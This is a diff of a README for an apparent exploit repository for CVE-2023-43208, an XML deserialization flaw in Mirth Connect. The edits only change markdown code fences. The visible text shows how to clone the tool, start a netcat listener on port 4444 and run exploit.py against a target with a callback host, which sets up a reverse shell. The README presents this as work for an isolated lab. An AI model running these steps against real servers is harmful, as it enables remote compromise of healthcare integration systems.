@@ -39,7 +39,6 @@ This exploit targets the XML deserialization vulnerability in Mirth Connect's `/
 
 ## 🚀 Installation
 
-```bash
 # Clone the repository
 git clone https://github.com/M0h4/CVE-2023-43208-EXPLOIT.git
 cd CVE-2023-43208-EXPLOIT
@@ -80,13 +79,12 @@ Never expose to internet
 
 Start your listener:
 
-bash
 ncat -lnvp 4444
 # or
 nc -lnvp 4444
 Run the exploit in your lab:
 
-bash
+
 python exploit.py -u https://192.168.1.100:8443 -lh 192.168.1.50 -lp 4444
 🧪 Test Environment Requirements
 Isolated network/VLAN
